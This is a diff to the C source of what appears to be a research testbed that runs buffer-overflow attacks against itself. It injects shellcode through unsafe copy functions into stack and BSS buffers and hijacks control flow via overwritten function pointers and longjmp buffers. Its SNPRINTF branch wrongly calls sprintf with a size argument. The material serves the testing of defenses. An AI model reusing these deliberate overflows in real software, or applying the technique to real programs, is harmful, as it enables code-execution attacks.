@@ -94,23 +94,7 @@ int main(int argc, char **argv) {
   }
 }
 
-
-
-void generate_payload() {
-
-  static struct attackme bss_struct = {"AAAAAAAA", &fooz};
-
-  static struct pointer_struct bss_indirect = {"AAAAAAA", NULL};
-  
-  if (attack.code_ptr == STRUCT_FUNC_PTR_BSS) {
-    payload.overflow_ptr = payload.target_addr = bss_struct.buffer;
-    payload.buffer = &bss_struct.func_ptr;
-  }
-  else if (attack.technique == INDIRECT && attack.location == BSS) {
-    payload.buffer = bss_indirect.buf;
-    payload.overflow_ptr = ((uintptr_t)(RET_ADDR_PTR) - 0x10);
-    payload.target_addr = &bss_indirect.mem_ptr;
-  }
+char* generate_payload() {
 
   size_t total_size = (uintptr_t) payload.target_addr - (uintptr_t) payload.buffer + sizeof(int);
 
@@ -120,20 +104,48 @@ void generate_payload() {
     fprintf(stderr, "malloc failed\n");
   }
 
-//  printf("buffer is %x\ntarget is %x\n", payload.buffer, payload.target_addr);
-
   int overflow_ptr = (int) payload.overflow_ptr;
   memcpy(temp_char_buffer, payload.contents, payload.size);
 
   char* tc_ra_location = (char*) ((uintptr_t) temp_char_buffer + total_size - sizeof(int));
   memcpy(tc_ra_location, &overflow_ptr, sizeof(int));
-  memcpy(payload.buffer, temp_char_buffer, total_size);
 
-  //we do this so that the compiler doesn't optimize away the memcpy
-  printf("%c\n", *((char*) payload.buffer));
+  payload.size = total_size;
+  return temp_char_buffer;
 }
 
+void write_to_buffer(char* temp_char_buffer) {
+  char format_string_buf[16];
 
+  switch(attack.function) {
+  case MEMCPY:
+    memcpy(payload.buffer, temp_char_buffer, payload.size);
+    break;
+  case STRCPY:
+    strcpy(payload.buffer, temp_char_buffer);
+    break;
+  case STRNCPY:
+    strncpy(payload.buffer, temp_char_buffer, payload.size);
+    break;
+  case SPRINTF:
+    sprintf(payload.buffer, "%s", temp_char_buffer);
+    break;
+  case SNPRINTF:
+    sprintf(payload.buffer, payload.size, "%s", temp_char_buffer);
+    break;
+  case STRCAT:
+    strcat(payload.buffer, temp_char_buffer);
+    break;
+  case STRNCAT:
+    strncat(payload.buffer, temp_char_buffer, payload.size);
+    break;
+  case SSCANF:
+    snprintf(format_string_buf, 15, "%%%ic", payload.size);
+    sscanf(temp_char_buffer, format_string_buf, payload.buffer);
+    break;
+  }  
+  printf("%c\n", *((char*) payload.buffer));
+}
 
 void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param) {  
 
@@ -141,8 +153,6 @@ void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param)
   char buf[BUFFER_SIZE];
 
   struct pointer_struct stack_indirect;
-
-  static struct pointer_struct bss_indirect = {"AAAAAAAA", &fooz};
 
   struct jmp_struct stack_jmp_struct;
   int val_struct;
@@ -171,6 +181,14 @@ void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param)
   attack.location = STACK;
 
   payload.size = size_createfile_shellcode;
+
+  static struct attackme bss_struct = {"AAAAAAAA", &fooz};
+
+  static struct pointer_struct bss_indirect = {"AAAAAAA", NULL};
+
+  static struct jmp_struct bss_jmp_struct;
+
+  int vsl_bss = setjmp(bss_jmp_struct.env_buffer);
 
   // set the buffer to be used
   switch(attack.location) {
@@ -230,6 +248,25 @@ void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param)
       }
       payload.overflow_ptr = payload.buffer;
       break;
+
+    case BSS:
+      if (attack.technique == DIRECT && attack.code_ptr == STRUCT_FUNC_PTR_BSS) {
+        payload.overflow_ptr = payload.buffer = bss_struct.buffer;
+        payload.target_addr = &bss_struct.func_ptr;
+      }
+      else if (attack.technique == DIRECT && attack.code_ptr == LONGJMP_BUF_BSS) {
+        payload.overflow_ptr = payload.buffer = bss_jmp_struct.buf;
+        payload.target_addr = &bss_jmp_struct.env_buffer;
+      }
+      else if (attack.technique == INDIRECT) {
+        payload.buffer = bss_indirect.buf;
+        payload.target_addr = &bss_indirect.mem_ptr;
+      }
+      else {
+        exit(1);
+      }
+      payload.overflow_ptr = payload.buffer;
+      break;
   }
 
   // if the attack is indirect, set the overflow_ptr appropriately
@@ -247,6 +284,9 @@ void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param)
       case STRUCT_FUNC_PTR_DATA:
         payload.overflow_ptr = &data_struct.func_ptr;
         break;
+      case STRUCT_FUNC_PTR_BSS:
+        payload.overflow_ptr = &bss_struct.func_ptr;
+        break;
       case FUNC_PTR_STACK_PARAM:
         payload.overflow_ptr = &stack_func_ptr_param;
         break;
@@ -259,6 +299,9 @@ void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param)
       case LONGJMP_BUF_DATA:
         payload.overflow_ptr = &data_jmp_struct.env_buffer;
         break;
+      case LONGJMP_BUF_BSS:
+        payload.overflow_ptr = &bss_jmp_struct.env_buffer;
+        break;
       case LONGJMP_BUF_STACK_PARAM:
         payload.overflow_ptr = &stack_jmp_buf_param;
    }
@@ -266,8 +309,8 @@ void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param)
 
   payload.contents = createfile_shellcode;
 
-  generate_payload(&fooz);
-
+  char* temp_char_buffer = generate_payload(&fooz);
+  write_to_buffer(temp_char_buffer);
 
   // if the attack is indirect, set the mem_ptr appropriate
   if (attack.technique == INDIRECT && attack.location == STACK) {
@@ -287,6 +330,9 @@ void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param)
       case STRUCT_FUNC_PTR_DATA:
         data_struct.func_ptr();
         break;
+      case STRUCT_FUNC_PTR_BSS:
+        bss_struct.func_ptr();
+        break;
       case FUNC_PTR_STACK_PARAM:
         stack_func_ptr_param();
         break;
@@ -298,6 +344,9 @@ void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param)
         break;
       case LONGJMP_BUF_DATA:
         longjmp(data_jmp_struct.env_buffer, 7);
+        break;
+      case LONGJMP_BUF_BSS:
+        longjmp(bss_jmp_struct.env_buffer, 7);
         break;
     }
   }
@@ -455,7 +504,7 @@ void set_location(char *choice) {
 
 void set_function(char *choice) {
   if(strcmp(choice, opt_funcs[0]) == 0) {
-    attack.function = MEMCPY;/*
+    attack.function = MEMCPY;
   } else if(strcmp(choice, opt_funcs[1]) == 0) {
     attack.function = STRCPY;
   } else if(strcmp(choice, opt_funcs[2]) == 0) {
@@ -469,12 +518,12 @@ void set_function(char *choice) {
   } else if(strcmp(choice, opt_funcs[6]) == 0) {
     attack.function = STRNCAT;
   } else if(strcmp(choice, opt_funcs[7]) == 0) {
-    attack.function = SSCANF;
+    attack.function = SSCANF; /*
   } else if(strcmp(choice, opt_funcs[8]) == 0) {
     attack.function = FSCANF;
   } else if(strcmp(choice, opt_funcs[9]) == 0) {
-    attack.function = HOMEBREW;*/
-  } else {
+    attack.function = HOMEBREW; */
+   } else {
       fprintf(stderr, "Error: Unknown choice of vulnerable function \"%s\"\n",
 	      choice);
     exit(1);
